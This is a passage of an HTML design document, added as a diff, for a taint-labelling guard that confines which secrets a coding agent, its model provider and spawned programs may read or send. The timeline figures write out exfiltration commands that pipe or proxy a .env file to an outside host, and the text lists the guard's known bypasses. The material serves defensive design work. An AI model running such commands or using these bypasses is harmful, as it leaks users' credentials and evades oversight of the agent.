+    <tr><td class="k">WRITE</td><td>any other file: no check, no grant needed</td><td colspan="2">the write proceeds, and the file lands with its label</td><td>the file <b>refers</b> to its sources' labels, evaluated as the intersection when checked: a revoked binding reaches every copy. Openers are not inherited. The path enters the guard's index, and the label follows <code>rename</code> and <code>link</code>. Today it records the level only, and the program gate never learns it (D4)</td></tr>
+  </tbody>
+</table></div>
+<p class="note">In Plan 13's notation, a holder's label is <code>Label(h) = ∩ { Release(d) : h has read d raw }</code>. The same intersection is the label of anything made from two pieces of data (Figure 3). The check runs at the later of a flow's two events: at the sink event if the read came first, at the raw read if the sink was already open (Figure 4).</p>
+
+<h3>(d) What each level allows today (Plan 13 §2)</h3>
+<div class="tw"><table>
+  <thead><tr><th></th><th>public</th><th>any-model</th><th>local-model</th><th>no-model</th></tr></thead>
+  <tbody>
+    <tr><td class="k">READ, agent</td><td><span class="chip raw">raw</span></td><td><span class="chip sym">symbol</span>; the helper may read (rung 2); an in-context read is a logged declassification (rung 3)</td><td><span class="chip sym">symbol</span>; raw only to a declared local model</td><td><span class="chip sym">symbol</span>, always; not even the helper</td></tr>
+    <tr><td class="k">READ, program</td><td><span class="chip raw">raw</span></td><td colspan="3">no <code>readers:</code> list: the twin for every program. With a list: listed programs raw and tainted, everyone else EACCES (or the twin under <code>others: twin</code>). The agent's process is never a reader</td></tr>
+    <tr><td class="k">SEND, network</td><td>allowed</td><td colspan="3">a symbol is released only at the file's <code>bindings</code>, else ask; a tainted process may <code>connect()</code> directly only to bound destinations, and through the session's proxy the sender is judged the same way on every leg, HTTPS included (D6, fixed 2026-10-02)</td></tr>
+    <tr><td class="k">WRITE</td><td>allowed</td><td colspan="3">a file written by a tainted process or a high session gets a derived label with the level only: no bindings, no readers. The program gate never learns it, so every program opens it raw, and <code>mv</code> drops it (D4)</td></tr>
+    <tr><td class="k">pipeline <code>A | B</code></td><td>n/a</td><td colspan="3">the model exit folds over the call's tree, when the tree is found (D7); the network and write exits do not fold (D2)</td></tr>
+  </tbody>
+</table></div>
+<figcaption>Figure 2. A label is three relations. Release names the sinks the raw bytes may reach and travels with the data; Openers names the programs that may open the file and stays at the read gate; Trust says what a model sees of an opener's output. Reads shrink a holder's label, and writes make a file refer to what its writer held. In (d), past the READ, agent row, the three secret levels behave as one level. A level only says which <i>models</i> may see the data; destinations are named by the bindings beside it. That is why Release has to be a set.</figcaption>
+</figure>
+
+<!-- ============ Figure 3 ============ -->
+<h2>Figure 3. Labels as sink sets, and what two files make</h2>
+<figure>
+<div class="tw"><table class="mx">
+  <thead>
+    <tr><th class="f" rowspan="2">object</th><th rowspan="2">level</th><th class="grp" colspan="3">models</th><th class="grp" colspan="4">openers (read gate only)</th><th class="grp" colspan="4">destinations</th><th rowspan="2">human</th></tr>
+    <tr><th class="p">external</th><th class="p">helper</th><th class="p">local</th><th class="p">python3</th><th class="p">mysql</th><th class="p">curl</th><th class="p">git</th><th class="p">github.com</th><th class="p">gmail.com</th><th class="p">db.internal</th><th class="p">attacker.com</th></tr>
+  </thead>
+  <tbody>
+    <tr><td class="f"><code>README.md</code></td><td><span class="lv public">public</span></td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td><td class="base">●</td></tr>
+    <tr><td class="f"><code>docs/contract.pdf</code></td><td><span class="lv mid">any-model</span></td><td class="base">●<sup>1</sup></td><td class="base">●</td><td class="base">●</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="grant">◆</td><td class="none">·</td><td class="none">·</td><td class="base">●</td></tr>
+    <tr><td class="f"><code>data/customers.csv</code></td><td><span class="lv mid">local-model</span></td><td class="none">·</td><td class="none">·</td><td class="base">●</td><td class="grant">◆</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="base">●</td></tr>
+    <tr><td class="f"><code>.env</code></td><td><span class="lv hi">no-model</span></td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="grant">◆</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="grant">◆</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="base">●</td></tr>
+    <tr><td class="f"><code>~/.my.cnf</code></td><td><span class="lv hi">no-model</span></td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="grant">◆</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="grant">◆</td><td class="none">·</td><td class="base">●</td></tr>
+    <tr class="div"><td colspan="14">python3 has read <code>.env</code> <b>and</b> <code>data/customers.csv</code>. What may its call, and a file it writes, reach?</td></tr>
+    <tr><td class="f">the call, today (union of bindings, D1)</td><td><span class="lv hi">no-model</span></td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="na" colspan="4">n/a: openers are per file</td><td class="bad">✕</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="base">●</td></tr>
+    <tr><td class="f">the call, Plan 13 (intersection)</td><td><span class="lv hi">no-model</span></td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="na" colspan="4">n/a: the tree is one holder</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="base">●</td></tr>
+    <tr><td class="f">a copy it writes, today (D4)</td><td><span class="lv hi">no-model</span></td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="bad">✕</td><td class="bad">✕</td><td class="bad">✕</td><td class="bad">✕</td><td class="bad">✕</td><td class="bad">✕</td><td class="none">·<sup>2</sup></td><td class="bad">✕</td><td class="base">●</td></tr>
+    <tr><td class="f">a copy it writes, Plan 13 (by reference)</td><td><span class="lv hi">no-model</span></td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="none">·</td><td class="base">●</td></tr>
+  </tbody>
+</table></div>
+<p class="note">● raw by the level (<code>Models(level)</code>, and the human always). <span style="color:var(--ok)">◆</span> raw by a grant: an opener (<code>readers:</code>) in the opener columns, a binding in the destination columns. · never raw: a symbol, the twin, EACCES or ask. <span style="color:var(--secret)">✕</span> raw today where the design says no. The opener columns are checked at the open and do not travel with the data. <sup>1</sup> any-model to the external model: a symbol by default; raw only through the helper (rung 2) or a logged in-context declassification (rung 3). <sup>2</sup> The untainted program that opens the copy raw reaches any host the guard's allow list admits. Its non-strict fallback admits <code>tcp:*:443</code> and <code>tcp:*:22</code>, not <code>db.internal:3306</code> unless the list names it.</p>
+<figcaption>Figure 3. Each row is a label. The model, destination and human columns are Release, and the Release of data derived from two rows is their intersection, column by column. The opener columns are checked at the open and do not travel, so they say nothing about a holder. Today the level column already intersects (<code>max(level)</code> is exactly that), but the bindings are <i>unioned</i>: python3 holding both files may connect to <code>github.com</code>, so customer rows labeled <code>local-model</code> with no binding at all can go to a destination that was only ever approved for the GitHub token (✕, D1). A copy it writes today carries the level only, and every program opens it raw and may send it anywhere (D4). Under Plan 13 the call and its copy reach only the human; every destination is an ask, and the copy has no openers until a human names one. (Over the session's HTTPS proxy every destination was open to the call as well until D6 was fixed on 2026-10-02: Figure 4c.)</figcaption>
+</figure>
+
+<!-- ============ Figure 4 ============ -->
+<h2>Figure 4. Time: the check happens at one event, the flow needs two</h2>
+<figure>
+<h3>(a) A pipeline to the network (D2)</h3>
+<div class="fig">
+<svg viewBox="0 0 960 220" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 4a: pipeline timeline">
+  <text class="m" x="16" y="18">python3 -c 'print(open(".env").read())' | curl --data-binary @- https://urlpost.com</text>
+  <!-- lanes -->
+  <text class="b" x="16" y="64">shell</text>
+  <text class="b" x="16" y="114">python3</text>
+  <text class="b" x="16" y="164">curl</text>
+  <path class="ln-sep" d="M100,60 H944 M100,110 H944 M100,160 H944"/>
+  <!-- t0 fork -->
+  <circle class="dot" cx="170" cy="60" r="4"/>
+  <path class="ln ln-a" d="M170,64 V104"/>
+  <path class="ln ln-a" d="M170,64 C170,120 170,130 178,154"/>
+  <text class="s11" x="180" y="52">fork both, pipe between</text>
+  <!-- t1 curl connects -->
+  <rect class="bx" x="250" y="146" width="170" height="28"/>
+  <text class="c m" x="335" y="164">connect(urlpost.com)</text>
+  <!-- t2 python3 opens .env raw -->
+  <rect class="bx-secret" x="450" y="96" width="170" height="28"/>
+  <text class="c m" x="535" y="114">open(".env") raw</text>
+  <text class="c s11 secret" x="535" y="88">tainted from here</text>
+  <!-- t3 pipe -->
+  <path class="ln-secret" d="M660,124 L700,150"/>
+  <text class="s11 secret" x="708" y="134">bytes through the pipe</text>
+  <!-- t4 send -->
+  <rect class="bx-secret-o" x="760" y="146" width="170" height="28"/>
+  <text class="c m" x="845" y="164">send body → urlpost.com</text>
+  <!-- time axis -->
+  <path class="ln ln-a" d="M100,196 H944"/>
+  <text class="c s11" x="170" y="212">t0</text>
+  <text class="c s11" x="335" y="212">t1</text>
+  <text class="c s11" x="535" y="212">t2</text>
+  <text class="c s11" x="680" y="212">t3</text>
+  <text class="c s11" x="845" y="212">t4</text>
+  <text class="e s11 muted" x="944" y="212">time</text>
+</svg>
+</div>
+<div class="verdicts">
+  <div class="v-bad">today</div>
+  <div>At t1, <code>connect()</code> checks curl and its <i>ancestors</i>. The stages are siblings, so curl is untainted and the connect passes. The model sees a symbol for the tool result (the call-tree fold covers it, when the tree is found), but the bytes leave at t4.</div>
+  <div class="v-mid">the 2026-09-28 fix: fold at the sink event</div>
+  <div>At t1, <code>connect()</code> checks the whole call tree. At t1 the tree is still clean, so the connect passes. It is blocked only when python3 happens to open first (t2 before t1): the fix is timing-dependent, since it depends on which stage the scheduler runs first.</div>
+  <div class="v-ok">Plan 13 (revised): check at the later event</div>
+  <div>The guard keeps, per holder, the sinks it has open. At t2 the raw open finds the tree already holding a connection to <code>urlpost.com</code>, which is not in <code>Release(.env)</code>, so the open becomes an ask (or EACCES under a hard deny). Had python3 read first, curl's <code>connect()</code> would be the later event and be checked against the tree's label. Whichever of the source and the sink comes second, that event carries the check. Prerequisite: the call tree recorded at fork and exec, with a production call-root recorder (D7). Today the tree is guessed from the most recent exec with the same command signature, and a subshell that never execs leaves no edge.</div>
+</div>
+
+<h3>(b) A redirect opened before the read (D5)</h3>
+<div class="fig">
+<svg viewBox="0 0 960 170" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 4b: redirect timeline">
+  <text class="m" x="16" y="18">python3 reader.py &gt; out.txt</text>
+  <text class="b" x="16" y="64">shell child</text>
+  <text class="s11 muted" x="16" y="78">then python3</text>
+  <text class="b" x="16" y="124">out.txt</text>
+  <path class="ln-sep" d="M100,60 H944 M100,120 H944"/>
+  <rect class="bx" x="140" y="46" width="200" height="28"/>
+  <text class="c m" x="240" y="64">open("out.txt", O_WRONLY)</text>
+  <text class="s11 muted" x="248" y="94">untainted: no label</text>
+  <path class="ln ln-d" d="M240,74 V112"/>
+  <rect class="bx" x="370" y="46" width="130" height="28"/>
+  <text class="c m" x="435" y="64">execve(python3)</text>
+  <rect class="bx-secret" x="530" y="46" width="170" height="28"/>
+  <text class="c m" x="615" y="64">open(".env") raw</text>
+  <rect class="bx-secret-o" x="730" y="46" width="150" height="28"/>
+  <text class="c m" x="805" y="64">write(fd 1, …)</text>
+  <path class="ln-secret" d="M805,74 V112"/>
+  <rect class="bx-secret-o" x="730" y="112" width="150" height="20"/>
+  <text class="c s11 secret" x="805" y="126">secret bytes, no label</text>
+  <path class="ln ln-a" d="M100,154 H944"/>
+  <text class="c s11" x="240" y="168">t0</text>
+  <text class="c s11" x="435" y="168">t1</text>
+  <text class="c s11" x="615" y="168">t2</text>
+  <text class="c s11" x="805" y="168">t3</text>
+</svg>
+</div>
+<div class="verdicts">
+  <div class="v-bad">today</div>
+  <div>The write gate labels at the write-intent <i>open</i> (t0). At t0 the process is not yet tainted, so <code>out.txt</code> gets no label and the next session reads the secret as public. (Confirmed by code read; no test reproduces it yet.)</div>
+  <div class="v-ok">Plan 13 (revised): check at the later event</div>
+  <div>At t2 the raw read is the later event. Every file the holder already has open for writing takes the label on the spot, so <code>out.txt</code> refers to <code>.env</code>'s label from t2 on. No <code>write(2)</code> interception is needed. This is the rule of (a), applied to the write exit.</div>
+</div>
+
+<h3>(c) A reader sends through the session's HTTPS proxy (D6, fixed 2026-10-02)</h3>
+<div class="fig">
+<svg viewBox="0 0 960 230" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 4c: a reader's HTTPS request through the session proxy is never checked against its taint">
+  <text class="m" x="16" y="18">HTTPS_PROXY=http://127.0.0.1:… python3 -c 'd = open(".env").read(); post("https://urlpost.com", d)'</text>
+  <text class="b" x="16" y="64">python3</text>
+  <text class="s11 muted" x="16" y="78">one reader</text>
+  <text class="b" x="16" y="114">net-guard</text>
+  <text class="b" x="16" y="164">net-proxy</text>
+  <path class="ln-sep" d="M100,60 H944 M100,110 H944 M100,160 H944"/>
+  <!-- t0 raw read -->
+  <rect class="bx-secret" x="130" y="46" width="160" height="28"/>
+  <text class="c m" x="210" y="64">open(".env") raw</text>
+  <text class="c s11 secret" x="210" y="40">tainted from here</text>
+  <!-- t1 connect to the proxy -->
+  <rect class="bx" x="320" y="46" width="190" height="28"/>
+  <text class="c m" x="415" y="64">connect(127.0.0.1:proxy)</text>
+  <path class="ln ln-a" d="M415,74 V94"/>
+  <rect class="bx" x="320" y="96" width="190" height="28"/>
+  <text class="c m" x="415" y="114">loopback: check skipped</text>
+  <!-- t2 CONNECT at the proxy -->
+  <path class="ln ln-a" d="M510,110 H525 V160 H538"/>
+  <rect class="bx" x="540" y="146" width="200" height="28"/>
+  <text class="c m" x="640" y="164">CONNECT urlpost.com:443</text>
+  <text class="c s11 muted" x="640" y="190">MITM leg: no procKey · tunnel: no check</text>
+  <!-- t3 bytes leave -->
+  <path class="ln-secret" d="M740,160 H770"/>
+  <rect class="bx-secret-o" x="772" y="146" width="160" height="28"/>
+  <text class="c m" x="852" y="164">body → urlpost.com</text>
+  <!-- time axis -->
+  <path class="ln ln-a" d="M100,206 H944"/>
+  <text class="c s11" x="210" y="222">t0</text>
+  <text class="c s11" x="415" y="222">t1</text>
+  <text class="c s11" x="640" y="222">t2</text>
+  <text class="c s11" x="852" y="222">t3</text>
+  <text class="e s11 muted" x="944" y="222">time</text>
+</svg>
+</div>
+<div class="verdicts">
+  <div class="v-bad">before 2026-10-02</div>
+  <div>At t1 the guard skips the taint check for a loopback destination, on the ground that proxied traffic is judged again at the net-proxy. The net-proxy checks taint only on plain HTTP, where it resolves the sending process. The MITM leg calls <code>gateRequest</code> with no <code>procKey</code>, so the taint branch is skipped, and a blind <code>CONNECT</code> tunnel has no taint check at all. The raw bytes reach any HTTPS host. Only the verbatim fingerprint tripwire stands, and any encoding defeats it. This is not a pipeline: every reader is affected.</div>
+  <div class="v-ok">today (§7 step 3, done)</div>
+  <div>The net-proxy resolves the sending process on every leg, the MITM and <code>CONNECT</code> legs included, and checks the request against <code>Label(holder)</code>: <code>urlpost.com</code> is not in <code>Release(.env)</code>, so it is an ask. A <code>CONNECT</code> it cannot decrypt for a tainted process is refused unless the destination is bound, and judged again before each chunk; a connection it cannot attribute is refused while the session holds a secret. The guard's loopback exemption stays only for the proxy's port, and only while the proxy attributes every leg (§7 step 3).</div>
+</div>
+<figcaption>Figure 4. A flow needs a source event (a raw read) and a sink event (a connect, a proxied request, a write-open), and they can come in either order. A gate that checks only at the sink event misses the order where the sink comes first (a, b). A gate that hands its check to another must have it made there (c). Plan 13 checks each holder at the later of a flow's two events, on every leg of the proxy, which makes the result independent of timing.</figcaption>
+</figure>
+
+<!-- ============ Figure 5 ============ -->
+<h2>Figure 5. The write loop: what a derived file carries</h2>
+<figure>
+<div class="fig">
+<svg viewBox="0 0 960 300" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 5: derived labels by reference, and synced folders as destinations">
+  <rect class="bx-secret" x="16" y="116" width="200" height="60"/>
+  <text class="c b" x="116" y="136">python3's call</text>
+  <text class="c s11 secret" x="116" y="152">read .env raw</text>
+  <text class="c s11" x="116" y="167">Label = {human, github.com}</text>
+
+  <path class="ln ln-a" d="M216,146 H236 V56 H258"/>
+  <path class="ln ln-a" d="M236,146 H258"/>
+  <path class="ln ln-a" d="M236,146 V246 H258"/>
+
+  <!-- ordinary storage -->
+  <path class="bx-secret-o" d="M260,36 h164 l16,16 v24 h-180 z"/>
+  <text class="c m" x="350" y="54">~/ws/out/tok.txt</text>
+  <text class="c s11" x="350" y="69">storage</text>
+  <text class="s11 b secret" x="460" y="44">today</text>
+  <text class="s11" x="510" y="44">label = no-model only; no readers, no bindings; not in the guard's index</text>
+  <text class="s11" x="510" y="58">→ every program opens it raw and may send it anywhere; mv drops it (D4)</text>
+  <text class="s11 b ok" x="460" y="80">Plan 13</text>
+  <text class="s11" x="510" y="80">label = ref{.env}, evaluated as Release(.env) when checked</text>
+  <text class="s11" x="510" y="94">→ enters the guard's index; follows mv and ln; a revoked binding reaches it</text>
+  <text class="s11" x="510" y="108">→ no openers until a human names one: every program gets the twin</text>
+
+  <!-- synced folder -->
+  <path class="bx-secret-o" d="M260,126 h164 l16,16 v24 h-180 z"/>
+  <text class="c m" x="350" y="144">~/Dropbox/tok.txt</text>
+  <text class="c s11" x="350" y="159">synced folder</text>
+  <path class="ln-secret" d="M440,146 H520"/>
+  <rect class="bx" x="522" y="130" width="190" height="32"/>
+  <text class="c s11" x="617" y="145">sync daemon, outside the session</text>
+  <text class="c s11 muted" x="617" y="157">no Mandu gate on its reads</text>
+  <path class="ln-secret" d="M712,146 H790"/>
+  <rect class="bx-secret-o" x="792" y="130" width="152" height="32"/>
+  <text class="c m" x="868" y="150">dropbox.com</text>
+  <text class="s11 b secret" x="460" y="186">today</text>
+  <text class="s11" x="510" y="186">labeled like any copy; the daemon uploads it anyway</text>
+  <text class="s11 b ok" x="460" y="200">Plan 13</text>
+  <text class="s11" x="510" y="200">the write-open is a send to <tspan class="m">sync:dropbox</tspan>, outside Release(.env): ask</text>
+
+  <!-- any other path -->
+  <path class="bx-secret-o" d="M260,226 h164 l16,16 v24 h-180 z"/>
+  <text class="c m" x="350" y="244">/tmp/x</text>
+  <text class="c s11" x="350" y="259">any other path</text>
+  <text class="s11 b ok" x="460" y="244">Plan 13</text>
+  <text class="s11" x="510" y="244">no grant needed: the write lands with ref{.env}, as tok.txt does</text>
+  <text class="s11" x="510" y="258">(the 2026-09-28 <tspan class="m">stores:</tspan> grant is dropped)</text>
+</svg>
+</div>
+<figcaption>Figure 5. The write gate decides what the loop of Figure 1 carries back. Today a derived file keeps only the level, and the program gate never learns its path, so every program opens it raw (D4). Under Plan 13 a derived file <b>refers</b> to its sources' labels: its Release is their intersection, evaluated when checked, so a revoked binding or a raised level on a source reaches every copy. Openers are not inherited. The path enters the guard's index, which closes the D4 leak, and the label follows <code>rename</code> and <code>link</code>. This reverses only the "carries nothing" consequence of <code>derived-labels.ts</code>, not its refusal of the union. A synced folder is a destination, <code>sync:&lt;name&gt;</code>, and its write-open is checked like a <code>connect()</code>; every other write lands with its label and needs no grant.</figcaption>
+</figure>
+
+
+<!-- ============ Figure 6 ============ -->
+<h2>Figure 6. The agent's reads: the three rungs</h2>
+<figure>
+<h3>(a) Why the agent's read is already a send</h3>
+<p>A program such as python3 reads a file into its own memory, and only later, maybe, connects somewhere. Those are two events, and Mandu checks each at its own gate. The agent is different. Claude Code does nothing with a file's content except put it into the next request to its model, which runs at the provider (<code>api.anthropic.com</code>). The moment the agent reads a file is the moment the content leaves the machine. So Mandu cannot let the read through and check a send later: the decision about the agent's read <i>is</i> the decision about what the provider receives, and it is made in that outgoing request, at the model-API proxy.</p>
+<div class="fig">
+<svg viewBox="0 0 960 170" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 6a: a program's read and send are two events; the agent's are one">
+  <text class="b" x="16" y="30">a program</text>
+  <path class="bx-secret-o" d="M130,12 h64 l12,12 v20 h-76 z"/>
+  <text class="c m" x="168" y="34">.env</text>
+  <path class="ln-secret" d="M206,28 H258"/>
+  <rect class="gate" x="220" y="14" width="24" height="28"/>
+  <text class="c s11 b" x="232" y="58">READ</text>
+  <rect class="bx-secret" x="260" y="12" width="150" height="32"/>
+  <text class="c m" x="335" y="32">python3 (memory)</text>
+  <text class="c s11 muted" x="520" y="24">… any time later …</text>
+  <path class="ln ln-d" d="M410,28 H640"/>
+  <rect class="gate" x="650" y="14" width="24" height="28"/>
+  <text class="c s11 b" x="662" y="58">SEND</text>
+  <path class="ln ln-a" d="M674,28 H758"/>
+  <rect class="bx" x="760" y="12" width="184" height="32"/>
+  <text class="c m" x="852" y="32">github.com</text>
+
+  <text class="b" x="16" y="116">the agent</text>
+  <path class="bx-mid" d="M130,98 h64 l12,12 v20 h-76 z"/>
+  <text class="c m" x="168" y="120">contract</text>
+  <path class="ln ln-a" d="M206,114 H258"/>
+  <rect class="bx" x="260" y="98" width="150" height="32"/>
+  <text class="c m" x="335" y="118">Claude Code</text>
+  <path class="ln ln-a" d="M410,114 H518"/>
+  <text class="c s11" x="464" y="106">next request</text>
+  <rect class="gate" x="520" y="92" width="170" height="44"/>
+  <text class="c b" x="605" y="111">model-API proxy</text>
+  <text class="c s11" x="605" y="126">one decision: read = send</text>
+  <path class="ln ln-a" d="M690,114 H758"/>
+  <rect class="bx" x="760" y="98" width="184" height="32"/>
+  <text class="c m" x="852" y="118">api.anthropic.com</text>
+  <text class="s11 muted" x="16" y="160">The agent's process itself only ever gets the twin; the proxy decides what of it the provider sees.</text>
+</svg>
+</div>
+
+<h3>(b) Three ways to use a file the model may not simply read</h3>
+<p>Take <code>docs/contract.pdf</code> (<code>any-model</code>: the provider is cleared to read it). By default the model sees only a symbol. When the task needs more, there are three rungs, cheapest first (<code>confidentiality.md</code> §3.3). Each one exposes the content a little more.</p>
+<ol>
+  <li><b>Rung 1, route.</b> The model never sees the content. It moves the symbol around like a sealed envelope, for example putting it in a tool call that emails the contract. The real bytes are put back only at a cleared destination (a binding, here <code>gmail.com</code>). Zero exposure. The model can deliver the contract but cannot answer questions about it.</li>
+  <li><b>Rung 2, quarantined read.</b> The model asks a question about the symbol with <code>inspect_symbol</code>. A separate helper model call gets the content and the question, and nothing of the main conversation. Its answer comes back <i>as another symbol</i> with the contract's label, so the main model still does not see it; the human sees the answer through the reply filter. Use it for "summarize this" or "what date is in clause 7".</li>
+  <li><b>Rung 3, in-context read.</b> The model calls <code>declassify_symbol</code> and the proxy puts the real content into the main conversation. Use it when the model must reason over the content across many steps. It is logged, and it raises the session's watermark: from then on the whole session carries the contract's label, because a paraphrase has no symbol for any gate to catch. Files the session writes are labeled, and nothing leaves to a sink outside the label without approval.</li>
+</ol>
+<p>Rungs 2 and 3 both send the content to the provider. The difference is whether the <i>main conversation</i> has seen it: that conversation is what writes tool calls, files and replies. It can carry the content onward, so once it has read the content, the whole session has to be confined.</p>
+<div class="fig">
+<svg viewBox="0 0 960 300" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 6: the agent's read through the model-API proxy, three rungs">
+  <path class="bx-secret-o" d="M16,110 h124 l16,16 v28 h-140 z"/><path class="ln" d="M140,110 v16 h16"/>
+  <text class="c m" x="80" y="130">contract.pdf</text>
+  <text class="c s11 mid" x="84" y="145">any-model</text>
+  <rect class="bx" x="16" y="196" width="140" height="40"/>
+  <text class="c b" x="86" y="213">user prompt</text>
+  <text class="c s11" x="86" y="228">with a pasted ghp_ token</text>
+
+  <path class="ln ln-a" d="M156,132 H178"/>
+  <path class="ln ln-a" d="M156,216 H170 V160 H178"/>
+  <rect class="gate" x="180" y="40" width="44" height="236"/>
+  <text class="c b" transform="translate(206,158) rotate(-90)">model-API proxy</text>
+
+  <!-- rung 1 -->
+  <path class="ln ln-a" d="M224,70 H258"/>
+  <rect class="bx-ph" x="260" y="52" width="200" height="36"/>
+  <text class="c b" x="360" y="67">rung 1: symbol in context</text>
+  <text class="c m" x="360" y="81">$MDU:anymodel_Read[…]</text>
+  <path class="ln ln-a" d="M460,70 H488"/>
+  <rect class="bx" x="490" y="52" width="210" height="36"/>
+  <text class="c s11" x="595" y="67">the model routes the symbol</text>
+  <text class="c s11" x="595" y="81">into a tool call; no taint</text>
+  <path class="ln-ok" d="M700,70 H758"/>
+  <rect class="bx-ok" x="760" y="52" width="184" height="36"/>
+  <text class="c s11" x="852" y="67">released at a binding</text>
+  <text class="c m" x="852" y="81">gmail.com; else ask</text>
+
+  <!-- rung 2 -->
+  <path class="ln ln-a" d="M224,158 H258"/>
+  <rect class="bx-mid" x="260" y="140" width="200" height="36"/>
+  <text class="c b" x="360" y="155">rung 2: quarantined read</text>
+  <text class="c m" x="360" y="169">inspect_symbol</text>
+  <path class="ln ln-a" d="M460,158 H488"/>
+  <rect class="bx" x="490" y="140" width="210" height="36"/>
+  <text class="c s11" x="595" y="155">the helper reads raw,</text>
+  <text class="c s11" x="595" y="169">without the main context</text>
+  <path class="ln ln-a" d="M700,158 H758"/>
+  <rect class="bx-ph" x="760" y="140" width="184" height="36"/>
+  <text class="c s11" x="852" y="155">the answer comes back</text>
+  <text class="c s11" x="852" y="169">re-symbolized, same label</text>
+
+  <!-- rung 3 -->
+  <path class="ln ln-a" d="M224,246 H258"/>
+  <rect class="bx-secret" x="260" y="228" width="200" height="36"/>
+  <text class="c b" x="360" y="243">rung 3: in-context read</text>
+  <text class="c m" x="360" y="257">declassify_symbol</text>
+  <path class="ln-secret" d="M460,246 H488"/>
+  <rect class="bx-secret-o" x="490" y="228" width="210" height="36"/>
+  <text class="c s11" x="595" y="243">raw in the main context; logged;</text>
+  <text class="c s11" x="595" y="257">local-model needs a local main model</text>
+  <path class="ln-secret" d="M700,246 H758"/>
+  <rect class="bx-secret" x="760" y="228" width="184" height="36"/>
+  <text class="c s11" x="852" y="243">the whole session now</text>
+  <text class="c s11" x="852" y="257">carries the file's label</text>
+  <text class="s11 muted" x="16" y="292">The prompt enters at the same proxy. Today it passes raw, above every rung; decided (Plan 13 §4.8): a registered secret's value enters at rung 1.</text>
+</svg>
+</div>
+<h3>(c) One task, three rungs</h3>
+<p>The user asks: "When does the contract's termination clause end? Then email the contract to our lawyer."</p>
+<div class="tw"><table>
+  <thead><tr><th></th><th>the model calls</th><th>the main model sees</th><th>the provider receives</th><th>the human sees</th><th>afterwards</th></tr></thead>
+  <tbody>
+    <tr><td class="k">rung 1</td><td>a mail tool with the symbol as the attachment</td><td><code>$MDU:anymodel_Read[…]</code></td><td>the symbol only</td><td>the email went out; no date</td><td>nothing changes; the date question cannot be answered</td></tr>
+    <tr><td class="k">rung 2</td><td><code>inspect_symbol(sym, "when does the termination clause end?")</code></td><td>a new symbol for the answer</td><td>the contract and the question, in a helper call with no main conversation</td><td>the date, e.g. "31 March 2027", through the reply filter</td><td>no watermark; the answer carries the contract's label</td></tr>
+    <tr><td class="k">rung 3</td><td><code>declassify_symbol(sym)</code></td><td>the whole contract</td><td>the contract, inside the main conversation</td><td>whatever the model writes</td><td>logged; the session's label shrinks to the contract's. Written files are labeled, and sends outside the label need approval</td></tr>
+  </tbody>
+</table></div>
+
+<h3>(d) Which rungs each level allows, and the prompt</h3>
+<div class="tw"><table>
+  <thead><tr><th>object</th><th>rung 1: symbol in context</th><th>rung 2: quarantined helper</th><th>rung 3: in-context read</th></tr></thead>
+  <tbody>
+    <tr><td class="k"><span class="lv public">public</span></td><td colspan="3"><span class="chip raw">raw</span> in the main context; no rung applies</td></tr>
+    <tr><td class="k"><span class="lv mid">any-model</span></td><td><span class="chip sym">symbol</span> the default, taint-free</td><td><span class="chip ok">yes</span> the helper may be external</td><td><span class="chip ask">logged</span> raises the watermark</td></tr>
+    <tr><td class="k"><span class="lv mid">local-model</span></td><td><span class="chip sym">symbol</span></td><td><span class="chip ok">local helper only</span> never the default external one; refused when none is declared</td><td><span class="chip ask">local main model only</span></td></tr>
+    <tr><td class="k"><span class="lv hi">no-model</span></td><td><span class="chip sym">symbol</span></td><td><span class="chip deny">never</span></td><td><span class="chip deny">never</span></td></tr>
+    <tr><td class="k">prompt, today</td><td colspan="3"><span class="chip raw">raw</span> user-role text is trusted and forwarded as is; only <code>tool_result</code> blocks are symbolized</td></tr>
+    <tr><td class="k">prompt, decided</td><td colspan="3">scanned before forwarding for the values of registered secrets: a match becomes that secret's <span class="chip sym">symbol</span>, the same stable symbol it has everywhere (rung 1 from then on); the rest stays <span class="chip raw">raw</span>. An unregistered key reaches the model: the shape scan is withdrawn (Plan 14 §1), and Plan 14's scans are the answer to secrets nobody registered. The user can let one value through, logged</td></tr>
+  </tbody>
+</table></div>
+<figcaption>Figure 6. The agent's read goes straight to its model, so the decision is made once, at the model-API proxy. The rungs are three levels of exposure: route the symbol unseen (1); let a helper with no main conversation answer a question, returning a symbol (2); put the content in the main conversation and confine the whole session (3). The level decides which rungs a file may take. The prompt skips all three today; Plan 13 §4.8 records the decision to scan it for registered values.</figcaption>
+</figure>
+
+<!-- ============ Figure 7 ============ -->
+<h2>Figure 7. The other side of the matrix: per principal</h2>
+<figure>
+<p>Figure 3 read by column: for each principal, what it may see or open raw, what it only ever sees as a symbol or twin, and what it is refused or asked about. This is the per-principal view Plan 13 §5.3 asks the dashboard's Rules page to add, beside the per-file view; built 2026-10-11 as the Rules page's "Who may get your secrets" card (dashboard.md §4.25aa), which lists your rules per program, host and AI.</p>
+<h3>(a) Sinks: models, destinations, the human</h3>
+<div class="tw"><table>
+  <thead><tr><th>sink</th><th>sees raw</th><th>symbol or twin only</th><th>refused or asked</th></tr></thead>
